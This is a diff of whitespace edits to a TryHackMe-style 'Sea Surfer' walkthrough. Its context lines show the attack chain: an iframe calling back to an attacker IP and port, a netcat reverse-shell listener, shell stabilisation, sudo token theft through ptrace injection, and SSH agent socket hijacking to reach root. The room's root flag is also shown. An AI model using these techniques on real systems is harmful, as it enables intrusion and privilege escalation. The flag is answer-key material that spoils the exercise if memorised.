@@ -250,7 +250,6 @@ Producer                        : Qt 4.8.7
 Create Date                     : 2023:07:10 22:51:40Z
 Page Count                      : 1
 
-
 <iframe src="http://10.8.19.103:4444/> 
 
 └─$ rlwrap nc -lvp 4444
@@ -533,7 +532,6 @@ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.sp
 
 # Press Ctrl+Z
 
-
 stty raw -echo; fg; reset;
 
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; alias l="ls -tuFlah --color=auto"; export SHELL=bash; export TERM=xterm-256color; stty rows 200 columns 200; reset;
@@ -700,7 +698,6 @@ We all noticed that sometimes sudo doesn't ask us for a password because he reme
 ptrace protection is disabled (0)
 gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it
 
-
 `kyle` have used sudo to execute something in the last 15mins (by default that's the duration of the sudo token that allows to use sudo without introducing any password
 
 kyle@seasurfer:/tmp$ whoami
@@ -735,7 +732,6 @@ deb http://fi.archive.ubuntu.com/ubuntu focal-updates multiverse
 
 deb http://fi.archive.ubuntu.com/ubuntu focal-backports main restricted universe multiverse
 
-
 deb http://fi.archive.ubuntu.com/ubuntu focal-security main restricted
 deb http://fi.archive.ubuntu.com/ubuntu focal-security universe
 deb http://fi.archive.ubuntu.com/ubuntu focal-security multiverse
@@ -756,7 +752,6 @@ Saving to: ‘gdb.deb’
 gdb.deb        0%       0  --.-KB/sgdb.deb        0%  21.73K   105KB/sgdb.deb        1%  50.09K   120KB/sgdb.deb        3% 106.81K   170KB/sgdb.deb        7% 220.25K   263KB/sgdb.deb       14% 447.12K   428KB/sgdb.deb       28% 895.13K   713KB/sgdb.deb       50%   1.55M  1.04MB/sgdb.deb      100%   3.07M  1.93MB/s    in 1.6s    
 
 2023-07-10 19:52:53 (1.93 MB/s) - ‘gdb.deb’ saved [3218448/3218448]
-
 
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ ar x gdb.deb
@@ -1017,7 +1012,6 @@ export SSH_AUTH_SOCK="$(find /tmp/ -type s -path '/tmp/ssh-*/agent.*' -user $(wh
 
 /usr/bin/ssh -A -i /root/.ssh/id_rsa kyle@seasurfer.thm -tt 'sudo /root/admincheck; sleep infinity'
 
-
 root@seasurfer:~# cat hidePID.sh
 #!/bin/bash
 
@@ -1043,9 +1037,7 @@ exploit_v2.sh        systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-lo
 f                    systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-resolved.service-Y3ELhf
 gdb                  systemd-private-da298949e7224408b0aa7463ed43ecf5-systemd-timesyncd.service-Qx305e
 
-
 do it manually
-
 
 ┌──(witty㉿kali)-[~/Downloads/sudo_inject]
 └─$ tac exploit.sh 
@@ -1132,11 +1124,9 @@ bash: cd: ssh-RHwxIKi56zVJ: Permission denied
 
 we have to do is add the `SSH_AUTH_SOCK` and location to our environment variable and **PAM** would let us use `sudo`
 
-
 kyle@seasurfer:/tmp$ export SSH_AUTH_SOCK=/tmp/ssh-MLukItSUvl/agent.1127
 kyle@seasurfer:/tmp$ ssh-add -l
 3072 SHA256:boZASmxRncp8AM+gt1toNuZr9jh1dyatwf9DPZYit88 kyle@seasurfer (RSA)
-
 
 The command `ssh-add -l` is used to list the identities added to the SSH agent.
 
@@ -1149,9 +1139,7 @@ Listing the identities with `ssh-add -l` is useful for verifying which keys are 
 kyle@seasurfer:/tmp$ sudo -s
 root@seasurfer:/tmp# :)
 
-
 ```
-![[Pasted image 20230710174237.png]]
 
 What is user.txt?
 
@@ -1160,6 +1148,5 @@ What is user.txt?
 What is root.txt?
 
 *THM{STEALING_SUDO_TOKENS}*
-
 
 [[Anonymous Playground]]
